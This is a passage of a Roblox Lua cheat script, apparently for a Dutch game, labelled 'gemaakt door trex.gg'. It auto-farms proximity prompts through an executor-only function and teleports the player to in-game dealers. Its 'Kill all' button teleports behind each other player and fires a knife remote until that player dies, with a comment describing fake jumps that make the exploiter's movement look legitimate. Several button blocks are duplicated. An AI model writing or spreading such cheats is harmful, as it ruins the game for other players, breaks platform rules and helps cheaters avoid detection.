local blackFrame = Instance.new("Frame")
blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
blackFrame.Size = UDim2.new(1, 0, 1, 0)
blackFrame.Position = UDim2.new(0, 0, 0, 0)
blackFrame.Parent = screenGui

local textLabel = Instance.new("TextLabel")
textLabel.Text = "gemaakt door trex.gg tool farming bezig..."
textLabel.TextColor3 = Color3.new(1, 1, 1)
textLabel.BackgroundTransparency = 1
textLabel.Size = UDim2.new(0.5, 0, 0, 50)
textLabel.Position = UDim2.new(0.25, 0, 0.5, -25)
textLabel.Font = Enum.Font.SourceSansBold
textLabel.TextScaled = true
textLabel.Parent = blackFrame

spawn(function()
    local texts = {
        "gemaakt door trex.gg tool farming bezig...",
        "gemaakt door trex.gg tool farming bezig..",
        "gemaakt door trex.gg tool farming bezig."
    }
    local index = 1
    while screenGui.Parent do
        textLabel.Text = texts[index]
        index = index % #texts + 1
        wait(0.5)
    end
end)

-- Lock camera to first person
camera.CameraSubject = character:WaitForChild("Humanoid")
camera.CameraType = Enum.CameraType.Custom
player.CameraMode = Enum.CameraMode.LockFirstPerson

local function tryPositionsUntilClaimed(prompt, hrp)
    local part = prompt.Parent
    local basePos = part.Position

    local offsets = {
        part.CFrame.LookVector * 3,
        -part.CFrame.LookVector * 3,
        part.CFrame.RightVector * 3,
        -part.CFrame.RightVector * 3,
    }

    local claimed = false

    while prompt.Enabled and not claimed do
        for _, offset in ipairs(offsets) do
            if not prompt.Enabled then
                claimed = true
                break
            end

            local tryPos = basePos + offset + Vector3.new(0, 3, 0)
            character:MoveTo(tryPos)

            local start = tick()
            repeat
                wait(0.1)
                local dist = (hrp.Position - basePos).Magnitude
                if dist < prompt.MaxActivationDistance then break end
            until tick() - start > 1 or not prompt.Enabled

            if not prompt.Enabled then
                claimed = true
                break
            end

            local spamStart = tick()
            while prompt.Enabled and tick() - spamStart < 1 do
                fireproximityprompt(prompt)
                wait(0.1)
            end

            if not prompt.Enabled then
                claimed = true
                break
            end

            wait(0.2)
        end
    end
end

local hrp = character:WaitForChild("HumanoidRootPart")
local originalPosition = hrp.Position -- store original position before farming

for _, prompt in ipairs(stelenFolder:GetDescendants()) do
    if prompt:IsA("ProximityPrompt") and prompt.Enabled then
        tryPositionsUntilClaimed(prompt, hrp)
    end
end

-- Teleport back to original position after farming is done
character:MoveTo(originalPosition)

-- Remove black screen GUI
screenGui:Destroy()

-- Unlock camera
player.CameraMode = Enum.CameraMode.Classic

    end,
})
local LeeuwardenKnop2 = Leeuwarden:CreateButton({
    Name = "Teleporteer to Rob (Doorlaadsmechanischme)",
    Callback = function()
    local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local camera = workspace.CurrentCamera
local stelenFolder = workspace:WaitForChild("Stelen")

-- Create black screen GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BlackSjcreen"
screenGui.ResetOnSpawn = false
screenGui.Enabled = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = player:WaitForChild("PlayerGui")

local blackFrame = Instance.new("Frame")
blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
blackFrame.Size = UDim2.new(1, 0, 1, 0)
blackFrame.Position = UDim2.new(0, 0, 0, 0)
blackFrame.Parent = screenGui

local textLabel = Instance.new("TextLabel")
textLabel.Text = "gemaakt door trex.gg tool farming bezig..."
textLabel.TextColor3 = Color3.new(1, 1, 1)
textLabel.BackgroundTransparency = 1
textLabel.Size = UDim2.new(0.5, 0, 0, 50)
textLabel.Position = UDim2.new(0.25, 0, 0.5, -25)
textLabel.Font = Enum.Font.SourceSansBold
textLabel.TextScaled = true
textLabel.Parent = blackFrame

spawn(function()
    local texts = {
        "gemaakt door trex.gg tool farming bezig...",
        "gemaakt door trex.gg tool farming bezig..",
        "gemaakt door trex.gg tool farming bezig."
    }
    local index = 1
    while screenGui.Parent do
        textLabel.Text = texts[index]
        index = index % #texts + 1
        wait(0.5)
    end
end)


   local player = game.Players.LocalPlayer
   local tppart = workspace.Dealers.Rob.HumanoidRootPart
   local Character = player.Character
   Character:PivotTo(tppart.CFrame + Vector3.new(0, 0, 5))
    end,
})
local LeeuwardenKnop3 = Leeuwarden:CreateButton({
    Name = "Teleporteer to Frederik (Crafter)",
    Callback = function()
    local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local camera = workspace.CurrentCamera
local stelenFolder = workspace:WaitForChild("Stelen")

-- Create black screen GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BlackSjcreen"
screenGui.ResetOnSpawn = false
screenGui.Enabled = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = player:WaitForChild("PlayerGui")

local blackFrame = Instance.new("Frame")
blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
blackFrame.Size = UDim2.new(1, 0, 1, 0)
blackFrame.Position = UDim2.new(0, 0, 0, 0)
blackFrame.Parent = screenGui

local textLabel = Instance.new("TextLabel")
textLabel.Text = "gemaakt door trex.gg tool farming bezig..."
textLabel.TextColor3 = Color3.new(1, 1, 1)
textLabel.BackgroundTransparency = 1
textLabel.Size = UDim2.new(0.5, 0, 0, 50)
textLabel.Position = UDim2.new(0.25, 0, 0.5, -25)
textLabel.Font = Enum.Font.SourceSansBold
textLabel.TextScaled = true
textLabel.Parent = blackFrame

spawn(function()
    local texts = {
        "gemaakt door trex.gg tool farming bezig...",
        "gemaakt door trex.gg tool farming bezig..",
        "gemaakt door trex.gg tool farming bezig."
    }
    local index = 1
    while screenGui.Parent do
        textLabel.Text = texts[index]
        index = index % #texts + 1
        wait(0.5)
    end
end)


   local player = game.Players.LocalPlayer
   local tppart = workspace.Frederik.HumanoidRootPart
   local Character = player.Character
   Character:PivotTo(tppart.CFrame + Vector3.new(0, 0, 5))
    end,
})
local LeeuwardenKnop2 = Leeuwarden:CreateButton({
    Name = "Teleporteer to Rob (Doorlaadsmechanischme)",
    Callback = function()
    local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local camera = workspace.CurrentCamera
local stelenFolder = workspace:WaitForChild("Stelen")

-- Create black screen GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BlackSjcreen"
screenGui.ResetOnSpawn = false
screenGui.Enabled = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = player:WaitForChild("PlayerGui")

local blackFrame = Instance.new("Frame")
blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
blackFrame.Size = UDim2.new(1, 0, 1, 0)
blackFrame.Position = UDim2.new(0, 0, 0, 0)
blackFrame.Parent = screenGui

local textLabel = Instance.new("TextLabel")
textLabel.Text = "gemaakt door trex.gg tool farming bezig..."
textLabel.TextColor3 = Color3.new(1, 1, 1)
textLabel.BackgroundTransparency = 1
textLabel.Size = UDim2.new(0.5, 0, 0, 50)
textLabel.Position = UDim2.new(0.25, 0, 0.5, -25)
textLabel.Font = Enum.Font.SourceSansBold
textLabel.TextScaled = true
textLabel.Parent = blackFrame

spawn(function()
    local texts = {
        "gemaakt door trex.gg tool farming bezig...",
        "gemaakt door trex.gg tool farming bezig..",
        "gemaakt door trex.gg tool farming bezig."
    }
    local index = 1
    while screenGui.Parent do
        textLabel.Text = texts[index]
        index = index % #texts + 1
        wait(0.5)
    end
end)


   local player = game.Players.LocalPlayer
   local tppart = workspace.Dealers.Rob.HumanoidRootPart
   local Character = player.Character
   Character:PivotTo(tppart.CFrame + Vector3.new(0, 0, 5))
    end,
})
local LeeuwardenKnop4 = Leeuwarden:CreateButton({
    Name = "Teleporteer to Giel (Mesje)",
    Callback = function()
    local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local camera = workspace.CurrentCamera
local stelenFolder = workspace:WaitForChild("Stelen")

-- Create black screen GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BlackSjcreen"
screenGui.ResetOnSpawn = false
screenGui.Enabled = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = player:WaitForChild("PlayerGui")

local blackFrame = Instance.new("Frame")
blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
blackFrame.Size = UDim2.new(1, 0, 1, 0)
blackFrame.Position = UDim2.new(0, 0, 0, 0)
blackFrame.Parent = screenGui

local textLabel = Instance.new("TextLabel")
textLabel.Text = "gemaakt door trex.gg tool farming bezig..."
textLabel.TextColor3 = Color3.new(1, 1, 1)
textLabel.BackgroundTransparency = 1
textLabel.Size = UDim2.new(0.5, 0, 0, 50)
textLabel.Position = UDim2.new(0.25, 0, 0.5, -25)
textLabel.Font = Enum.Font.SourceSansBold
textLabel.TextScaled = true
textLabel.Parent = blackFrame

spawn(function()
    local texts = {
        "gemaakt door trex.gg tool farming bezig...",
        "gemaakt door trex.gg tool farming bezig..",
        "gemaakt door trex.gg tool farming bezig."
    }
    local index = 1
    while screenGui.Parent do
        textLabel.Text = texts[index]
        index = index % #texts + 1
        wait(0.5)
    end
end)


   local player = game.Players.LocalPlayer
   local tppart = workspace.Dealers.Giel.Torso
   local Character = player.Character
   Character:PivotTo(tppart.CFrame + Vector3.new(0, 0, 5))
    end,
})
local LeeuwardenKnop5 = Leeuwarden:CreateButton({
    Name = "Kill all (Mesje nodig)",
    Callback = function()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local remote = LocalPlayer.Character.Mesje.RemoteEvent

local function getHumanoid(player)
    return player.Character and player.Character:FindFirstChildOfClass("Humanoid")
end

for _, targetPlayer in pairs(Players:GetPlayers()) do
    if targetPlayer ~= LocalPlayer then
        local humanoid = getHumanoid(targetPlayer)
        
        -- Only proceed if the target has a character and humanoid
        if humanoid then
            -- Loop until the target is dead (Health == 0)
            while humanoid and humanoid.Health > 0 do
                if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    local targetHRP = targetPlayer.Character.HumanoidRootPart

                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        local localHRP = LocalPlayer.Character.HumanoidRootPart

                        -- Teleport 3 studs in front of the target and face them
                        local offset = targetHRP.CFrame.LookVector * -3
                        local position = targetHRP.Position + offset
                        local facingCF = CFrame.new(position, targetHRP.Position)

                        localHRP.CFrame = facingCF

                        -- Make the exploiter jump (simulating legit movement)
                        local myHumanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                        if myHumanoid then
                            myHumanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                        end

                        -- Fire damage remote
                        remote:FireServer()

                        wait(0.1)
                    end
                else
                    break -- Target character is missing (e.g., reset or left)
                end
            end
        end
    end
end

    end,
})
